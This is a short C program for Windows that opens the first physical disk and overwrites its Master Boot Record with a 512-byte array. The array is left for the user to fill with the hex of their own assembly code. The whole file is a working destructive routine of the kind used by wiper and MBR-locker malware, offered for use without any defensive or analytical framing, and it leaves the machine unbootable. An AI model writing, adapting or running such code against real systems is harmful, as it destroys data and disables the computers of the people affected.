#include <windows.h>

const unsigned char MasterBootRecord[] = {
    //Put here your assembly.asm hex, you can get it with HxD
};

int main() {
    DWORD ResultBytesWritten;
    HANDLE hDiskDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if(hDiskDevice == INVALID_HANDLE_VALUE) printf("[!] Cant handle PhysicalDrive0\n");
    bool ResultState = WriteFile(hDiskDevice, MasterBootRecord, 512, &ResultBytesWritten, 0);
    CloseHandle(hDiskDevice);

    if(!ResultState) printf("[!] Failed to overwrite the MBR\n");
    else printf("[+] MBR succesfully overwrote\n");
    Sleep(3000);
    return 0;
}
